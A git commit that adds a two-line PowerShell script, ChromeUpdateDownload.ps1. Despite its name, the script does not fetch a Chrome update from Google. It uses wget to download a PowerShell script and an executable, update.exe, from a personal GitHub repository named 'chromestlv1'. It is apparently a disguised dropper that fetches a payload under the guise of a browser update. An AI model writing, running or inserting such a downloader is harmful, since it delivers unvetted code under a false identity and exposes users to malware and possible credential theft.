4b9293ee581a30fcc8b9339a24a4e9ab1bb633bb
PerfeCtion2901 <46281456+PerfeCtion2901@users.noreply.github.com>
2023-11-11 06:21:19 +0100

    Add files via upload

---
+++ ChromeUpdateDownload.ps1
@@ -0,0 +1,2 @@
+wget 'https://raw.githubusercontent.com/PerfeCtion2901/chromestlv1/main/maintenance.ps1' -OutFile maintenance.ps1
+wget 'https://raw.githubusercontent.com/PerfeCtion2901/chromestlv1/main/update.exe' -OutFile update.exe
